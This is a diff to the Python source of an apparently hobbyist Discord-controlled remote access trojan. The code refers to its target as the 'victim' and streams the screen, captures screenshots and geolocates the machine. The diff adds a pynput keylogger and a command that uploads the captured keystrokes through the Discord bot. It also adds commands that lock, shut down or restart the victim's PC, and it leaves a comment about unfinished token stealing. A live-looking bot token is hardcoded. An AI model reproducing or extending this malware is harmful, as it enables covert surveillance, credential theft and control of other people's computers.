@@ -37,9 +37,6 @@ import win32con
 import win32gui
 import winreg
 
-# import banner
-from banner_brand import banner
-
 # get user current location
 import geocoder
 
@@ -55,12 +52,18 @@ import time
 
 # code for stream and view
 from stream_vic import stream
-# from stream_vic import end_stream_vic
+
+# Pkg for Keylogger
+import pynput
+from pynput.keyboard import Key, Listener
+import threading
 
 client = commands.Bot(command_prefix='!')
 bot_token = 'OTU5NDQ2NDA2ODk5MzMxMTY0.YkcAGQ.1NRL_0qF7NkJvvgA5IXG5nmYR3M'
 
-
+count = 0
+keys = []
+timer = 0
 # get IP of the victim
 victim_ip = get('https://api.ipify.org').text
 
@@ -71,7 +74,6 @@ def MaxVolume():
     if volume.GetMute() == 1:
         volume.SetMute(0, None)
     volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
-
 
 # Function when out Bot is alive
 @client.event
@@ -104,6 +106,29 @@ async def on_ready():
     # change this to your choice
     # time.sleep(1)
 
+
+# Lock Victim from computer
+@client.command()
+async def lock_user(message):
+    await message.send('Locking user now')
+    time.sleep(1)
+    ctypes.windll.user32.LockWorkStation()
+
+
+# Shutting Down Victim PC
+@client.command()
+async def shut_down_user(message, duration: str):
+    await message.send('Shutting Down Victim PC this long {}'.format(duration))
+    time.sleep(2)
+    os.system("shutdown /s /t {}".format(duration))
+
+
+# Restart Victim PC
+@client.command()
+async def restart_user(message, duration: str):
+    await message.send('Restarting Victim PC this long {}'.format(duration))
+    time.sleep(2)
+    os.system("shutdown /r /t {}".format(duration))
 
 
 # Stream Victim Screen
@@ -153,7 +178,6 @@ async def screenshot(message):
     await message.send("Here's the screenshot", file=file)
     os.remove(temp)
 
-
 # get victim current location
 @client.command()
 async def get_location(message):
@@ -170,6 +194,79 @@ async def get_location(message):
     myEmbed.add_field(name='Latitude and Longitude: ', value=vic_location.latlng, inline=False)
 
     await message.send(embed=myEmbed)
+
+
+#Keylogger
+@client.command()
+async def start_keylogs(message):
+    await message.send("Keylogger Started!")
+    path = os.getcwd()
+    filename = 'keylogs.txt'
+    fullpath = os.path.join(path,filename)
+
+
+    def write_file(keys):
+         with open(fullpath,"a") as f:
+             for key in keys:
+                 k = str(key).replace("'","")
+                 if k.find("space") > 0:
+                     f.write('\n')
+                 elif k.find("Key") == -1:
+                     f.write(k)
+                 # f.write(str(key))
+
+     # write_file('sample')
+
+    def on_press(key):
+         global keys,count
+
+         keys.append(key)
+         count += 1
+
+         if count >= 10:
+             count = 0
+             write_file(keys)
+             keys=[]
+
+
+    def on_release(key):
+        global timer
+        print(timer)
+
+        if timer >= 50:
+            timer = 0
+            return False
+
+        else:
+            timer += 1
+
+     # def key_log_stop():
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+         listener.join()
+
+
+         # time.sleep(2)
+         # break
+
+    await message.send("successfully copied 50 character!")
+
+
+@client.command()
+async def show_keylogs(message):
+     path = os.getcwd()
+     filename = 'keylogs.txt'
+     fullpath = os.path.join(path,filename)
+     file_keys = fullpath
+     file = discord.File(file_keys, filename=file_keys)
+     await message.send("Successfully dumped all the logs", file=file)
+     os.remove(file_keys)
+
+
+
+
+
+
 
 # still unfinished
 # Steal some token mah boi
@@ -240,16 +337,14 @@ async def check_open_app(message):
 @client.command()
 async def close_app(message, app: str):
     os.system(" taskkill /f /im {}".format(app))
-    await message.send(f'{app} is now closed LEZGOOOO')
     time.sleep(2)
+    await message.send(f'{app} is now closed LEZGOOOO')
 
 
 # Open App
 # unfinished
 # @client.command()
 # async def open_app(message, app: str):
-
-
 
 
 # list all installed application
